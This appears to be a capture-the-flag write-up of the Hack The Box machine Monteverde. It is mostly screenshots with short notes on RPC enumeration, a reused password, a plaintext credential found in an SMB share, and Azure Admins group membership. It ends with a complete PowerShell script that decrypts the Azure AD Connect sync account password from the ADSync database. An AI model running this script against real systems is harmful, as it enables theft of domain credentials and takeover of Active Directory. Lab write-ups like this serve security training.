![image 110.png](assets/Monteverde/image%20110.png)
  
![image 1 76.png](assets/Monteverde/image%201%2076.png)
- anonymous RPC works
  
![image 2 75.png](assets/Monteverde/image%202%2075.png)
  
SABatchJobs is also using SABatchJobs as their password
  
![image 3 68.png](assets/Monteverde/image%203%2068.png)
in an SMB share that SABatchJobs had access to
  
![image 4 64.png](assets/Monteverde/image%204%2064.png)
no kerberoastable
  
![image 5 63.png](assets/Monteverde/image%205%2063.png)
mhope:4n0therD4y@n0th3r$
  
![image 6 59.png](assets/Monteverde/image%206%2059.png)
mhope is part of azure admins
  
the azure admins are able to sync the on-prem AD environment with the cloud, abuse can be found here
[https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
  
POC found below
```JavaScript
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```
  
![image 7 57.png](assets/Monteverde/image%207%2057.png)